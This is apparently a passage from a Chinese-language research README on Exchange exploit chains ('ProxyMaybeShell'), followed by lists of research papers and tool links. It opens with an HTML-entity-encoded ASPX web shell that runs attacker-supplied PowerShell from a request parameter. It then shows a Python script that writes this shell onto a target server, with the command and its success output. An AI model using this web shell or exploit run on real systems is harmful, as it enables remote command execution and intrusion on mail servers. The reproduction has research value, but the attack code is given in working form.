&#x73;&#x73;&#x65;&#x6d;&#x62;&#x6c;&#x79;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2c;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x31;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x30;&#x2c;&#x43;&#x75;&#x6c;&#x74;&#x75;&#x72;&#x65;&#x3d;&#x6e;&#x65;&#x75;&#x74;&#x72;&#x61;&#x6c;&#x2c;&#x50;&#x75;&#x62;&#x6c;&#x69;&#x63;&#x4b;&#x65;&#x79;&#x54;&#x6f;&#x6b;&#x65;&#x6e;&#x3d;&#x33;&#x31;&#x42;&#x46;&#x33;&#x38;&#x35;&#x36;&#x41;&#x44;&#x33;&#x36;&#x34;&#x45;&#x33;&#x35;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x4c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x63;&#x23;&#x22;&#x20;&#x72;&#x75;&#x6e;&#x61;&#x74;&#x3d;&#x22;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x22;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x74;&#x65;&#x20;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x20;&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x65;&#x64;&#x28;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x20;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x54;&#x65;&#x78;&#x74;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x74;&#x72;&#x79;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x46;&#x61;&#x63;&#x74;&#x6f;&#x72;&#x79;&#x2e;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x4f;&#x70;&#x65;&#x6e;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x50;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x3d;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x50;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x43;&#x6f;&#x6d;&#x6d;&#x61;&#x6e;&#x64;&#x73;&#x2e;&#x41;&#x64;&#x64;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;&#x28;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x54;&#x65;&#x78;&#x74;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x43;&#x6f;&#x6d;&#x6d;&#x61;&#x6e;&#x64;&#x73;&#x2e;&#x41;&#x64;&#x64;&#x28;&#x22;&#x4f;&#x75;&#x74;&#x2d;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3c;&#x50;&#x53;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x3e;&#x20;&#x72;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x73;&#x20;&#x3d;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x49;&#x6e;&#x76;&#x6f;&#x6b;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x43;&#x6c;&#x6f;&#x73;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x66;&#x6f;&#x72;&#x65;&#x61;&#x63;&#x68;&#x20;&#x28;&#x50;&#x53;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x6f;&#x62;&#x6a;&#x20;&#x69;&#x6e;&#x20;&#x72;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x73;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x2e;&#x41;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x4c;&#x69;&#x6e;&#x65;&#x28;&#x6f;&#x62;&#x6a;&#x2e;&#x54;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x2e;&#x54;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x63;&#x61;&#x74;&#x63;&#x68;&#x28;&#x45;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x65;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x2e;&#x46;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x28;&#x22;&#x45;&#x72;&#x72;&#x6f;&#x72;&#x3a;&#x20;&#x7b;&#x30;&#x7d;&#x22;&#x2c;&#x20;&#x65;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x72;&#x6f;&#x74;&#x65;&#x63;&#x74;&#x65;&#x64;&#x20;&#x76;&#x6f;&#x69;&#x64;&#x20;&#x50;&#x61;&#x67;&#x65;&#x5f;&#x4c;&#x6f;&#x61;&#x64;&#x28;&#x6f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x73;&#x65;&#x6e;&#x64;&#x65;&#x72;&#x2c;&#x20;&#x45;&#x76;&#x65;&#x6e;&#x74;&#x41;&#x72;&#x67;&#x73;&#x20;&#x65;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x52;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x2e;&#x57;&#x72;&#x69;&#x74;&#x65;&#x28;&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x65;&#x64;&#x28;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x73;&#x5b;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x5d;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
```

 - ![](./pics/proxymaybeshell1.png)

然后将编码后的数据放入[proxynotshellfileWrite.py](./proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py)脚本中如下：

 - ![](./pics/proxymaybeshell2.png)

运行shell写入脚本

``` bash
root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain/proxymaybeshell/ProxyMaybeShell-main# python2 proxynotshellfileWrite.py https://10.0.102.210 "VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==" 1
[+] Create powershell session
[+] Got ShellId success
[+] Run keeping alive request
[+] Success keeping alive
[+] Run cmdlet new-offlineaddressbook
[+] Create powershell pipeline
[+] Run keeping alive request
[+] Success remove session
```

可以执行部分powershell命令，至此proxymaybeshell复现暂时告一段落

 - ![](./pics/proxymaybeshell3.png)

 - ![](./pics/proxymaybeshell4.png)









# Research white paper PDFs

 - [Friday the 13th JSON Attacks](research-pdfs/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
 - [ProxyLogon is Just the Tip of the Iceberg](research-pdfs/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf)
 - [Are you my Type? - Breaking .NET Through Serialization](research-pdfs/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
 - [Pwn2Own 2021 Microsoft Exchange Exploit Chain 3rd Vulnerability doc](research-pdfs/pwn2own2021msexchange3rdvulnpdf.docx)
 - [高级攻防演练下的Webshell](https://github.com/knownsec/KCon/blob/master/2021/%E9%AB%98%E7%BA%A7%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%8B%E7%9A%84Webshell.pdf)
 - [Cracking the Lens: Targeting HTTP's Hidden Attack Surface](research-pdfs/research-pdfs/crackingthelens-whitepaper.pdf)
 - [DPAPI exploitation during pentest and password cracking](research-pdfs/DPAPI%20exploitation%20during%20pentest.pdf)
 - [How I Hacked Microsoft Teams and got $150,000 in Pwn2Own](research-pdfs/How%20I%20Hacked%20pwn2own2022.pdf)
 - [SCALEABLE HASH TABLE FOR SHARED MEMORY MULTIPROCESSOR SYSTEM](research-pdfs/SCALEABLE%20HASH.TABLE%20FOR%20SHARED.pdf)
 - [Vulnerability Exchange: One Domain Account for More Than Exchange Server RCE](research-pdfs/Tianze%20Ding%20-%20Vulnerability%20Exchange%20-%20One%20Domain%20Account%20For%20More%20Than%20Exchange%20Server%20RCE.pdf)
 - [File Operation Induced Unserialization via the "phar://" Stream Wrapper](research-pdfs/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)
 - [Timeless Timing Attacks](research-pdfs/us-21-Timeless-Timing-Attacks.pdf)
 - [Practical Web Cache Poisoning: Redefining 'Unexploitable'](research-pdfs/web-cache-poisoning.pdf)
 - [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](research-pdfs/An%20ACE%20Up%20the%20Sleeve.pdf)


# offline address book

 - concept [Email addresses and address books in Exchange Server](https://learn.microsoft.com/en-us/exchange/email-addresses-and-address-books/email-addresses-and-address-books?view=exchserver-2019)
 - Design
 - [[MS-OXOAB]: Offline Address Book (OAB) File Format and Schema](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxoab/b4750386-66ec-4e69-abb6-208dd131c7de)
 - [[MS-OXWOAB]: Offline Address Book (OAB) Retrieval File Format](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxwoab/56ef97c8-641c-4cf6-b965-c0457cc50488)
 - [[MS-OXPFOAB]: Offline Address Book (OAB) Public Folder Retrieval Protocol](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxpfoab/258a07a7-34a7-4373-87c1-cddf51447d00)



# Low Level API (RPC)
 - [All protocols](./exchange-protocols/)
 - ![](./pics/protocols.png)
 - [A tool to abuse Exchange services](https://github.com/sensepost/ruler)
 - [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
 - [Exchange Server Protocol Documents](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxprotlp/30c90a39-9adf-472b-8b5b-03c282304a83?source=recommendations)
 - [Export items by using EWS in Exchange](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-export-items-by-using-ews-in-exchange)
 - [Autodiscover for Exchange](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/autodiscover-for-exchange)
 - [[MS-OXCFXICS]: Bulk Data Transfer Protocol](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcfxics/b9752f3d-d50d-44b8-9e6b-608a117c8532)


# Other Links

 - [ProxyVulns](https://github.com/hosch3n/ProxyVulns)
 - [pax](https://github.com/liamg/pax)
 - [padre](https://github.com/glebarez/padre)
 - [python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)
 - [ysoserial.net](https://github.com/pwntester/ysoserial.net)
 - [使用 ProxyShell 和 ProxyLogon 劫持邮件链](https://paper.seebug.org/1764/)
 - [Abusing Exchange: One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 - [后渗透/实验/Exchange](https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/Exchange.md)
